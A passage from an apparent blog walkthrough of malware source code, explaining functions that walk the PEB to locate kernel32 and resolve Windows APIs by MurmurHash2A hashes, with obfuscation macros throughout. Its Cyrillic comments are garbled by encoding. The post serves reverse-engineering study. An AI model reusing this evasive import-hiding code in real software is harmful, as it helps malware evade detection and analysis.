&#125;</span><br><span class="line">	<span class="keyword">return</span> Addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetForvardedProc"><a href="#GetForvardedProc" class="headerlink" title="GetForvardedProc"></a>GetForvardedProc</h4><p>first, this is the <strong>.dll</strong> string.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> szDll[] = &#123; <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">// 泽黻鲨 钺疣犷蜿?镥疱磬珥圜屙? 耧铕蜞</span></span><br><span class="line"><span class="comment">// 袜 怩钿?漕腈磬 猁螯 耱痤赅 DllName.ProcName 桦?DllName.#ProcNomber</span></span><br><span class="line">--szDll[<span class="number">3</span>];</span><br><span class="line">szDll[<span class="number">1</span>]++;</span><br><span class="line">++szDll[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<p>use the NameStr(ordNumber) to get each funtion of the dll.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">++NameStr;</span><br><span class="line">	<span class="keyword">if</span> (*NameStr == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 褥 怆弪? 眍戾痤?趔黻鲨?</span></span><br><span class="line">		++NameStr;</span><br><span class="line"></span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		DWORD OrdNomber = my_stoi(NameStr);</span><br><span class="line"></span><br><span class="line">		morphcode(OrdNomber);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, OrdNomber); </span><br></pre></td></tr></table></figure>

<p>or this will call this part of code, use the MurmurHash2A to import the function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);</span><br><span class="line"></span><br><span class="line">morphcode(Hash);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, Hash);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">LPVOID</span><br><span class="line"><span class="title function_">GetForvardedProc</span><span class="params">(__in PCHAR Name)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szDll[] = &#123; <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 袜 怩钿?漕腈磬 猁螯 耱痤赅 DllName.ProcName 桦?DllName.#ProcNomber</span></span><br><span class="line">	--szDll[<span class="number">3</span>];</span><br><span class="line">	szDll[<span class="number">1</span>]++;</span><br><span class="line">	++szDll[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	morphcode(szDll);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Name == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(Name);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> DLLName[<span class="number">256</span>];</span><br><span class="line">	<span class="comment">//m_memset(DLLName, 0, sizeof(DLLName));</span></span><br><span class="line">	RtlSecureZeroMemory(DLLName, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	morphcode(DLLName);</span><br><span class="line"></span><br><span class="line">	PCHAR NameStr = FindChar(Name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NameStr) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(NameStr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/// 杨徼疣屐 桁 徼犭桀蝈觇</span></span><br><span class="line">	m_memcpy(DLLName, Name, NameStr - Name);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcat</span>(DLLName, szDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/// 铒疱溴?屐 桁 趔黻鲨?</span></span><br><span class="line">	++NameStr;</span><br><span class="line">	<span class="keyword">if</span> (*NameStr == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 褥 怆弪? 眍戾痤?趔黻鲨?</span></span><br><span class="line">		++NameStr;</span><br><span class="line"></span><br><span class="line">		morphcode(*NameStr);</span><br><span class="line"></span><br><span class="line">		DWORD OrdNomber = my_stoi(NameStr);</span><br><span class="line"></span><br><span class="line">		morphcode(OrdNomber);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, OrdNomber); </span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);</span><br><span class="line"></span><br><span class="line">	morphcode(Hash);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> getapi::GetProcAddressEx(DLLName, <span class="number">0</span>, Hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CheckForForvardedProc"><a href="#CheckForForvardedProc" class="headerlink" title="CheckForForvardedProc"></a>CheckForForvardedProc</h4><p>used to check if the dll function is all imported.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckForForvardedProc</span><span class="params">(ADDR Addr, PIMAGE_EXPORT_DIRECTORY Table, DWORD DataSize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Addr &gt; (ADDR)Table) &#123;</span><br><span class="line"></span><br><span class="line">		morphcode(Addr);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((Addr - (ADDR)Table &lt; DataSize)) &#123;</span><br><span class="line"></span><br><span class="line">			morphcode(Table);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetFunctionAddresss"><a href="#GetFunctionAddresss" class="headerlink" title="GetFunctionAddresss"></a>GetFunctionAddresss</h4><ul>
<li>convert the function address that in the export function table.</li>
<li>use the Ordinal to get the RVA</li>
<li>RVA TO VA</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ADDR <span class="title function_">GetFunctionAddresss</span><span class="params">(HMODULE Module, PIMAGE_EXPORT_DIRECTORY Table, LONG Ordinal)</span></span><br><span class="line">&#123;</span><br><span class="line">	PDWORD AddrTable = (PDWORD)RVATOVA(Module, Table-&gt;AddressOfFunctions);</span><br><span class="line">	morphcode(AddrTable);</span><br><span class="line">	DWORD RVA = AddrTable[Ordinal];</span><br><span class="line">	morphcode(RVA);</span><br><span class="line">	ADDR Ret = (ADDR)RVATOVA(Module, RVA);</span><br><span class="line">	morphcode(Ret);</span><br><span class="line">	<span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ReturnAddress"><a href="#ReturnAddress" class="headerlink" title="ReturnAddress"></a>ReturnAddress</h4><blockquote>
<p>this function is not called in the whole code.</p>
<p>void CopyMemory(</p>
<p>  <em>In</em>    PVOID  Destination,</p>
<p>  <em>In</em> const VOID  *Source,</p>
<p>  <em>In</em>    SIZE_T Length </p>
<p>);</p>
</blockquote>
<p>get the first 4 byte of dwAddress, then temp+&#x3D;1 ,to get the three byte code(I guess it is the jmp address).It’s will Maybe used in hook.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">ReturnAddress</span><span class="params">(PDWORD pAddress, DWORD dwAddress)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD temp = dwAddress + <span class="number">1</span>;</span><br><span class="line">	morphcode(temp);</span><br><span class="line">	CopyMemory(&amp;temp, &amp;dwAddress, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	morphcode(temp);</span><br><span class="line">	temp++;</span><br><span class="line">	CopyMemory(pAddress, &amp;temp, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	morphcode(pAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="FindFunction"><a href="#FindFunction" class="headerlink" title="FindFunction"></a>FindFunction</h4><blockquote>
<p>this function is not called.</p>
</blockquote>
<p>return the Ordinary the hash in the Module’s export table.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">INT </span><br><span class="line"><span class="title function_">FindFunction</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in HMODULE Module,</span></span><br><span class="line"><span class="params">	__in  DWORD Hash,</span></span><br><span class="line"><span class="params">	__in PIMAGE_EXPORT_DIRECTORY Table</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Ordinal = <span class="number">0</span>;</span><br><span class="line">	morphcode(Ordinal);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HIWORD(Hash) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 腮屐 趔黻鲨?镱 甯 眍戾痼</span></span><br><span class="line">		Ordinal = (LOWORD(Hash)) - Table-&gt;Base;</span><br><span class="line">		morphcode(Ordinal);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table-&gt;AddressOfNames);</span><br><span class="line"></span><br><span class="line">		morphcode(NamesTable);</span><br><span class="line"></span><br><span class="line">		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">		morphcode(OrdinalTable);</span><br><span class="line"></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">		<span class="type">char</span>* ProcName;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Table-&gt;NumberOfNames; ++i)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			ProcName = (<span class="type">char</span>*)RVATOVA(Module, *NamesTable);</span><br><span class="line">			morphcode(ProcName);</span><br><span class="line">			DWORD ProcHash = MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ProcHash == Hash)</span><br><span class="line">			&#123;</span><br><span class="line">				morphcode(Ordinal);</span><br><span class="line"></span><br><span class="line">				Ordinal = *OrdinalTable;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 逾咫梓桠噱?镱玷鲨??蜞犭桷?</span></span><br><span class="line">			++NamesTable;</span><br><span class="line">			++OrdinalTable;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Ordinal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetApiAddr"><a href="#GetApiAddr" class="headerlink" title="GetApiAddr"></a>GetApiAddr</h4><p>find the ProcNameHash in the dll export function table, and then call function</p>
<ul>
<li>GetFunctionAddresss get the function address,and pass to the Next function CheckForForvardedProc</li>
<li>CheckForForvardedProc check if the function is outside the export function table<ul>
<li>GetForvardedProc <ul>
<li>getapi::GetProcAddressEx(DLLName, 0, OrdNomber);</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">ADDR <span class="title function_">GetApiAddr</span><span class="params">(HMODULE Module, DWORD ProcNameHash, ADDR* Address)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*----------- 泽黻鲨 忸玮疣弪 噤疱?趔黻鲨?镱 甯 磬玮囗棹 -----------*/</span></span><br><span class="line">	<span class="comment">// 项塍鬣屐 噤疱?漕镱腠栩咫 PE 玎泐腩怅钼</span></span><br><span class="line">	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((<span class="type">char</span>*)Module + ((PIMAGE_DOS_HEADER)Module)-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD) + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 项塍鬣屐 噤疱?蜞犭桷?耧铕蜞</span></span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">	DWORD DataSize = poh-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;</span><br><span class="line"></span><br><span class="line">	INT Ordinal; <span class="comment">// 皖戾?礤钺躅滂祛?磬?趔黻鲨?</span></span><br><span class="line">	BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HIWORD(ProcNameHash) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 腮屐 趔黻鲨?镱 甯 眍戾痼</span></span><br><span class="line">		Ordinal = (LOWORD(ProcNameHash)) - Table-&gt;Base;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 腮屐 趔黻鲨?镱 眍戾痼</span></span><br><span class="line">		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table-&gt;AddressOfNames);</span><br><span class="line">		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">		<span class="type">char</span>* ProcName;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Table-&gt;NumberOfNames; ++i)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			ProcName = (<span class="type">char</span>*)RVATOVA(Module, *NamesTable);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash)</span><br><span class="line">			&#123;</span><br><span class="line">				Ordinal = *OrdinalTable;</span><br><span class="line">				Found = TRUE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 逾咫梓桠噱?镱玷鲨??蜞犭桷?</span></span><br><span class="line">			++NamesTable;</span><br><span class="line">			++OrdinalTable;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 礤 磬?眍戾?</span></span><br><span class="line">	<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">		*Address = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CheckForForvardedProc(Ret, Table, DataSize)) &#123;</span><br><span class="line">		Ret = (ADDR)GetForvardedProc((PCHAR)Ret);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ReturnAddress(Address, Ret + 1);</span></span><br><span class="line">	<span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetHashBase"><a href="#GetHashBase" class="headerlink" title="GetHashBase"></a>GetHashBase</h4><p>get the Module Name ,generate  and return the hash</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GetHashBase(__in LDR_MODULE* mdll)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (mdll-&gt;dllname.Buffer[i] &amp;&amp; i &lt; <span class="keyword">sizeof</span>(name) - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		morphcode(mdll-&gt;dllname.Buffer[i]);</span><br><span class="line"></span><br><span class="line">		name[i] = (<span class="type">char</span>)mdll-&gt;dllname.Buffer[i];</span><br><span class="line"></span><br><span class="line">		morphcode(name[i]);</span><br><span class="line"></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	name[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> MurmurHash2A(name, StrLen(name), HASHING_SEED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetKernel32"><a href="#GetKernel32" class="headerlink" title="GetKernel32"></a>GetKernel32</h4><p>the peb is used to get the DllList.Loop the DllList and find the kernel32.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	mdl = (LDR_MODULE*)mdl-&gt;e[<span class="number">0</span>].Flink;</span><br><span class="line">	morphcode(mdl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mdl-&gt;base != nullptr)</span><br><span class="line">	&#123;</span><br><span class="line">		morphcode(mdl-&gt;base);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (GetHashBase(mdl) == KERNEL32DLL_HASH) &#123; <span class="comment">// KERNEL32.DLL</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (mlink != (INT_PTR)mdl);</span><br></pre></td></tr></table></figure>

<p>then you can get the kernel32 handle with the base</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">krnl32 = static_cast&lt;HMODULE&gt;(mdl-&gt;base);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">GetKernel32()</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE krnl32;</span><br><span class="line">	PCWCHAR Kernel32Dll = OBFW(<span class="string">L&quot;Kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> ModuleList = <span class="number">0x18</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> ModuleListFlink = <span class="number">0x18</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> KernelBaseAddr = <span class="number">0x10</span>;</span><br><span class="line">	<span class="type">const</span> INT_PTR peb = __readgsqword(<span class="number">0x60</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">int</span> ModuleList = <span class="number">0x0C</span>;</span><br><span class="line">	<span class="type">int</span> ModuleListFlink = <span class="number">0x10</span>;</span><br><span class="line">	<span class="type">int</span> KernelBaseAddr = <span class="number">0x10</span>;</span><br><span class="line">	INT_PTR peb = __readfsdword(<span class="number">0x30</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> mdllist = *(INT_PTR*)(peb + ModuleList);</span><br><span class="line">	morphcode(mdllist);</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> mlink = *(INT_PTR*)(mdllist + ModuleListFlink);</span><br><span class="line">	morphcode(mlink);</span><br><span class="line">	<span class="keyword">auto</span> krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);</span><br><span class="line">	morphcode(krnbase);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">auto</span> mdl = (LDR_MODULE*)mlink;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		mdl = (LDR_MODULE*)mdl-&gt;e[<span class="number">0</span>].Flink;</span><br><span class="line">		morphcode(mdl);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mdl-&gt;base != nullptr)</span><br><span class="line">		&#123;</span><br><span class="line">			morphcode(mdl-&gt;base);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (GetHashBase(mdl) == KERNEL32DLL_HASH) &#123; <span class="comment">// KERNEL32.DLL</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (mlink != (INT_PTR)mdl);</span><br><span class="line"></span><br><span class="line">	krnl32 = static_cast&lt;HMODULE&gt;(mdl-&gt;base);</span><br><span class="line">	morphcode(krnl32);</span><br><span class="line">	<span class="keyword">return</span> krnl32;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><h4 id="MurmurHash2A"><a href="#MurmurHash2A" class="headerlink" title="MurmurHash2A"></a>MurmurHash2A</h4><ul>
<li><p>convert to lowchar</p>
</li>
<li><p>every 4 byte convert to unsigned int data ,then mmix with the seed. If the length is less than 4, Convert it one by one,then mmix</p>
<ul>
